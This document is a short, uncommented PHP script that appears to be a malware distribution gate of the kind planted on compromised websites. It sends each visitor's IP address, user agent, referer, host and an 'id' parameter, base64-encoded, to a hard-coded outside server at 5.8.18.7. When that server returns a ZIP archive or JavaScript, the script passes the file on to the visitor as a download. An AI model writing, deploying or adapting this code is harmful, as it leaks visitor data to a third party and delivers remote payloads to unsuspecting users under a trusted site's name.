<?php
function ph($headers)
{
    $head = array();
    foreach ($headers as $k => $v)
    {
        $t = explode(':', $v, 2);
        if (isset($t[1])) $head[trim($t[0]) ] = trim($t[1]);
        else
        {
            $head[] = $v;
            if (preg_match("#HTTP/[0-9\.]+\s+([0-9]+)#", $v, $out)) $head['reponse_code'] = intval($out[1]);
        }
    }
    return $head;
}
$g = '-';
if (isset($_GET['id']))
{
    $g = $_GET['id'];
}
if (isset($_SERVER['REMOTE_ADDR'])) $i = base64_encode($_SERVER['REMOTE_ADDR']);
else $i = '-';
if (isset($_SERVER['HTTP_USER_AGENT'])) $u = base64_encode($_SERVER['HTTP_USER_AGENT']);
else $u = '-';
if (isset($_SERVER['HTTP_REFERER'])) $r = base64_encode($_SERVER['HTTP_REFERER']);
else $r = '-';
if (isset($_SERVER['HTTP_HOST'])) $h = base64_encode($_SERVER['HTTP_HOST']);
else $h = '-';
$g = base64_encode($g);
$e = file_get_contents("http://5.8.18.7/filezzz.php?a=$i&b=$u&c=$r&d=$h&e=$g");
if ((strstr($e, 'PK')) or (strstr($e, '.js')))
{
    $a = ph($http_response_header);
    if ((isset($a["Content-Disposition"])) and (isset($a["Content-Type"])) and (isset($a["Content-Length"])) and (isset($a["Accept-Ranges"])))
    {
        header("Content-Type: " . $a["Content-Type"]);
        header("Accept-Ranges: " . $a["Accept-Ranges"]);
        header("Content-Length: " . $a["Content-Length"]);
        header("Content-Disposition: " . $a["Content-Disposition"]);
        echo $e;
    }
    else exit;
}
else exit;

